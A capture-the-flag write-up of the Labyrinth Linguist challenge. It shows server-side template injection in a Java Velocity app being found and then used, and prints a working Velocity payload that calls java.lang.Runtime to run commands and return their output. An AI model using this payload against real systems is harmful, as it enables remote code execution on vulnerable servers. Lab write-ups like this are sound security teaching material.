# Labyrinth Linguist

## Enumeration

The web application shows a simple submit box to translate english to a made up language with some crazy unreadable font:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

Looking through the provided source code, we see it is Java based and using the Velocity template library.
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

No sign of user input sanitization in our text parameter so we should be good to go to try Server Side Template Injection:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

Testing with a standard payload for this template, we have confirmed SSTI when we see the classic 49.

```
#set ($run=7*7) $run
```
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

## Solution
Getting code execution isn't too difficult, a quick google search gives us the first link:  
[https://antgarsil.github.io/posts/velocity/](https://antgarsil.github.io/posts/velocity/)  
But we can find the same payload on [Hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#velocity-java) as well.

However, both payloads needs to be adjusted a bit because they don't seem to work out of the box. This payload from this [blog](https://gosecure.github.io/template-injection-workshop/#6) helped me refine the one below:  

```
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id')) $ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))#end
```
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

From the source code we already know our flag is in the root directory but we need to know the exact name:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

Trying to read it with a wildcard breaks our syntax:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

So we just take another step to list it to get the name:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

And now we can read it:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

`HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}`
